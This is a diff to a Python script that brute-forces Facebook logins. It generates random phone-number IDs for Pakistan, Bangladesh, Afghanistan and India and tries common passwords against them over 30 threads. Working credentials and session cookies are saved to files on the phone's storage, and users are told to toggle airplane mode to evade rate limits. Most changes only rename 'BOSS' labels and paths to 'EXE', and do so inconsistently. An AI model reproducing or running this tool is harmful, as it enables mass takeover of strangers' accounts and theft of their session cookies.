@@ -347,7 +347,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as BOSS:     
+                with tred(max_workers=30) as EXE:     
                         clear()
                         
                         tl = str(len(user))
@@ -358,7 +358,7 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
-                                BOSS.submit(rndm,ids,passlist)
+                                EXE.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -389,14 +389,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
-                                BOSS.submit(rndm,ids,passlist)
+                                EXE.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python BOSS.py')
+                os.system('python EXE.py')
 
 def afg():
                 user=[]
@@ -416,7 +416,7 @@ def afg():
                         tl = str(len(user))
                         print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                         print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
-                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mBOSS Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
+                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mEXE Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -428,7 +428,7 @@ def afg():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python .py')
+                os.system('python EXE.py')
 def ind():
                 user=[]
                 clear()
@@ -447,7 +447,7 @@ def ind():
                         tl = str(len(user))
                         print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                         print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
-                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mBOSS Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
+                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mEXE Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -529,18 +529,18 @@ def api1(ids,names,passlist):
                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in q:
-                    print('\r\r\033[1;32m [BOSS-OK] '+ids+' | '+pas+'\033[1;97m')
-                    open('/sdcard/BOSS/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
+                    print('\r\r\033[1;32m [EXE-OK] '+ids+' | '+pas+'\033[1;97m')
+                    open('/sdcard/EXE/EXE-OK.txt','a').write(ids+'|'+pas+'\n')
                     oks.append(ids)
                     break
                 elif 'www.facebook.com' in q['error_msg']:
                     if 'y' in pcp:
                         print('\r\r\x1b[38;5;205m [BOSS-CP] '+ids+' | '+pas+'\033[1;97m')
-                        open('/sdcard/BOSS/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open('/sdcard/EXE/EXE-CP.txt','a').write(ids+'|'+pas+'\n')
                         cps.append(ids)
                         break
                     else:
-                        open('/sdcard/BOSS/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open('/sdcard/EXE/EXE-CP.txt','a').write(ids+'|'+pas+'\n')
                         break
                 else:
                     continue
@@ -554,7 +554,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BOSS-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [EXE-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -631,11 +631,11 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BOSS-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [EXE-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                      
                                         open('/sdcard/BOSS/BOSS-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BOSS/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/EXE/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -645,12 +645,12 @@ def api2(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BOSS-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BOSS/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [EXE-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/EXE/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BOSS/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/EXE/BOSS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -744,11 +744,11 @@ def rndm(ids,passlist):
                                         break
                                 else:
                                         
-                                        print('\r\r\033[1;32m [BOSS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [EXE-OK] '+str(uid)+' √ '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
-                                        open('/sdcard/BOSS/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BOSS/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/EXE/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/EXE/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -758,8 +758,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[1;31m [BOSS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BOSS/BOSS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;31m [EXE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/EXE/BOSS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
